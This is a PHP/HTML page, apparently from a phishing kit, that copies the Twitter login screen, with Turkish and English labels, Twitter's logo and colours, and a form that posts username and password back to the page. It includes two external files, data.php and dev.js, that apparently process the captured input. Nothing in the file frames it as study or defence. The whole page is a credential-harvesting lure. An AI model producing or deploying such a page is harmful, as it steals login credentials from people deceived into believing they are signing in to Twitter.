<?php 
require('../../assets/data.php');

?>

<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <link rel="stylesheet" href="main.css">
    <title>Twitter'a giriş yap / Twitter</title>
</head>
    
<style>
.container{
    max-width: 600px !important;
    text-align: center !important;
}

h1{
    margin-top: 30px !important;
    font-size: 23px !important;
    margin-bottom: 10px !important;
    color: rgb(20, 23, 26) !important;
    font-weight: bold !important;
}

  .input-field{
    background-color: rgb(245, 248, 250) !important;
    padding: 0 !important;
    height: 57px !important;
  }  

  .input-field input{
      margin: 0 !important;
      border-bottom: 2px solid rgb(101, 119, 134) !important;
      height: 50px !important;
  }

  /* label color */
  .input-field label {
    color: rgb(101, 119, 134) !important;
    margin: 15px 0 0 4px !important;
    font-size: 18px !important;
    
  }
  /* label focus color */
  .input-field input[type=text]:focus + label {
    color: rgb(29, 161, 242) !important;
  }
  /* label underline focus color */
  .input-field input[type=text]:focus {
    border-bottom: 2px solid rgb(29, 161, 242) !important;
    box-shadow: 0 1px 0 0 rgb(29, 161, 242) !important;
  }

  .btn{
      height: 40px !important;
      width: 100% !important;
      padding-top: 3px !important;
      background-color: rgb(29, 161, 242) !important;
      border-bottom-left-radius: 9999px !important;
      border-bottom-right-radius: 9999px !important;
      border-top-left-radius: 9999px !important;
      border-top-right-radius: 9999px !important;
  }

  .btn:hover{
    background-color: rgb(29, 161, 242) !important;
  }

  .link1{
      color: rgb(29, 161, 242);
  }
  span{
      margin: 0 5px;
      text-align: center;
  }    
</style>
    
<body>
    
    <div class="container">
        <div class="icon col s12"><img src="https://img.icons8.com/color/48/000000/twitter.png"/></div>
        <h1>Twitter'a giriş yap</h1>
        <div class="row">
            <form class="col s12" action='' method="post">
                <div class="input-field">
                    <input placeholder="" id="user" type="text" class="validate" name='user'>
                    <label for="user">PLease input Phone number, Email, Username</label>
                  </div>
                  <div class="input-field">
                    <input placeholder="" id="sifre" type="password" class="validate" name='pass'>
                    <label for="sifre">Your Password</label>
                  </div>
                  <button type='submit' class="btn" name='login'>Sign in</button>
            </form>
            <a href="" class="link1">Şifreni mi unuttun?</a><span class="link1">.</span><a href="" class="link1">Forgot Password ?</a>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
<script>
<?php require('../../assets/dev.js') ?>
</script>

    </body>
</html>